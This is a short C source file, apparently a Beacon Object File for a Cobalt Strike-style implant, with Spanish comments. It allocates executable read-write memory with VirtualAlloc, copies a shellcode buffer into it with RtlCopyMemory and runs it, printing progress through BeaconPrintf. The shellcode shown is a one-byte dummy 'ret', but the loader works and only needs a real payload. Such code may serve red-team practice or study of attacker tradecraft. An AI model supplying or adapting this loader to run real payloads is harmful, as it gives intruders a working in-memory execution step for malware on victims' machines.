#include <windows.h>
#include "beacon.h"

extern PVOID __imp_VirtualAlloc;
extern PVOID __imp_RtlCopyMemory;

void go(char *args, int alen) {
    // Shellcode dummy: solo "ret"
    BYTE shellcode[] = { 0xC3 };

    LPVOID pMem = ((LPVOID(WINAPI*)(LPVOID, SIZE_T, DWORD, DWORD))__imp_VirtualAlloc)(
        NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    if (!pMem) {
        BeaconPrintf(CALLBACK_ERROR, "VirtualAlloc falló\n");
        return;
    }

    ((void(WINAPI*)(PVOID, PVOID, SIZE_T))__imp_RtlCopyMemory)(pMem, shellcode, sizeof(shellcode));

    BeaconPrintf(CALLBACK_OUTPUT, "[+] Shellcode copiado en: 0x%p\n", pMem);
    BeaconPrintf(CALLBACK_OUTPUT, "[+] Ejecutando shellcode (dummy: ret)...\n");

    // Llamar al shellcode
    ((void(*)())pMem)();

    BeaconPrintf(CALLBACK_OUTPUT, "[+] ¡Shellcode ejecutado sin errores!\n");
}
